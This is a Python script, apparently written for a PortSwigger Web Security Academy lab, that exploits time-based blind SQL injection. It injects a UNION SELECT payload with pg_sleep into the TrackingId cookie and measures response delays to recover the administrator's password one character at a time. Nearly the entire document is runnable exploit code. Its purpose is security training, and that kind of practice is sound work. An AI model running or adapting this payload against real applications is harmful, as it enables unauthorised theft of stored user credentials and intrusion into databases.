################################################################
# Vadim Polovnikov
# Date: 20-10-2020
# Platform: PortSwigger Web Security Academy
# Lab: SQL Injection >> Blind >>
# >> 'Exploiting blind SQL injection by triggering time delays'
# Description:
'''
Python script for blind SQL injection exploitation
based on a technique of triggering time delays
'''
################################################################

import requests
import time
import concurrent.futures

url = input("Enter the URL: ")

# Burp Suite proxy for debugging
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

start = time.perf_counter()

# Creating a session with the web app
with requests.Session() as s:
        r = s.get(url, proxies=proxies, verify=False)
        print(r.headers)  # Response headers

        cj = r.cookies  # CookieJar object
        cj_dict = requests.utils.dict_from_cookiejar(cj)  # CookieJar object --> Dictionary

        print(cj_dict)

        # Extracting cookie names
        cookie_names = [cookie for cookie in cj_dict.keys()]
        # Deleting TrackingId cookie
        cj.clear(domain=url.split('/')[-1], path='/', name=cookie_names[0])

        # ASCII numeric values (a-b, 0-9)
        ascii_num_file = open('/Users/vadimpolovnikov/list.txt', 'r')
        characters_list = ascii_num_file.read().split('\n')

        print("Password is loading ...")

        def sqli_pass_brute(pass_character):
                for n in characters_list:
                        sqli = f"' UNION SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password, {pass_character}, 1))={n}) THEN 'abc' || pg_sleep(3) ELSE NULL END FROM users--"

                        cj.set(
                            cookie_names[0], sqli,
                            domain=url.split('/')[-1], path='/'
                                )  # Setting new injected TrackingId

                        # Calculating delay
                        reuqest_time = time.perf_counter()
                        s.get(url, cookies = cj, proxies = proxies, verify = False)
                        response_time = time.perf_counter()
                        time_diff = round(response_time - reuqest_time)
                        print(time_diff)

                        if time_diff > 2:
                                letter = chr(int(n))
                                break
                        else:
                                print(f"[NOT] {n}")

                return letter

# Manual brute-forcing 1, 2, 3, ... 20
print(sqli_pass_brute(20))
